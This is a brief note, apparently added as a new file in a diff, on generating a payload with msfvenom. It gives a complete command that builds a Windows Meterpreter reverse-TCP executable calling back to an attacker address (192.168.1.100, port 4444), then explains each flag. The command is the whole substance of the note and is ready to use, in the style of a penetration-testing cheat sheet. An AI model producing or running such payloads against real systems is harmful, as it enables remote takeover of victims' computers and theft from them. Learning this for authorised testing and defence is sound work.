@@ -1,0 +1,9 @@
+Using msfvenom:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
+-p: Payload type
+
+LHOST: Attacker IP
+
+LPORT: Listening port
+
+-f exe: Output format
